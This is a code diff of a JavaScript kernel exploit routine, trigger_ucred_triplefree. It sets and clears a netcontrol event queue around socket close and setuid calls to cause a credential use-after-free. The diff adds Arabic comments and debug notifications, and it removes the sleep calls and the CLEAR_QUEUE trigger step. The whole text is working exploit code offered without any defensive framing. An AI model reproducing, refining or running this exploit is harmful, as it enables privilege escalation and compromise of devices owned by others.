@@ -1429,39 +1429,38 @@ function trigger_ucred_triplefree() {
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
+    // عدّاد التشغيل (لو هتكرر البلوك)
+    var run_id = (typeof run_id === "undefined") ? 1 : (run_id + 1);
+
+    send_notification("===== RUN #" + run_id + " START =====");
+
+    // 1) فتح dummy_socket
     send_notification("[1] Opening dummy_socket...");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    send_notification("[1] dummy_socket FD = " + dummy_socket);
 
+    // تسجيله في الـ queue
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    send_notification("[1] SET_QUEUE with FD = " + dummy_socket);
 
+    var r1 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    send_notification("[1] netcontrol(SET_QUEUE) ret = " + r1);
+
+    // إغلاق السوكت
     close(new BigInt(dummy_socket));
-    send_notification("[sleep] after closing dummy_socket");
-    nanosleep_fun(50_000_000); // 50ms
+    send_notification("[1] dummy_socket closed");
 
-
-    send_notification("[2] setuid(1)...");
+    // 2) تغيير الهوية
+    send_notification("[2] Calling setuid(1)...");
     setuid(1);
-    nanosleep_fun(10_000_000); // 10ms
 
+    // 3) فتح socket جديد
+    send_notification("[3] Opening new socket...");
+    var new_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    send_notification("[3] new_socket FD = " + new_socket);
 
-    send_notification("[3] Opening uaf_socket...");
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
-    nanosleep_fun(20_000_000); // 20ms
-
-
-    send_notification("[4] setuid(1) again...");
-    setuid(1);
-    nanosleep_fun(10_000_000);
-
-
-    send_notification("[5] CLEAR_QUEUE...");
-    write32(nc_clear_buf, uaf_socket);
-    nanosleep_fun(5_000_000);
-
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-
-    send_notification("[✓] Done.");
+    // نهاية التشغيل
+    send_notification("===== RUN #" + run_id + " END =====");
 
 
     // 6) refcount fix loop
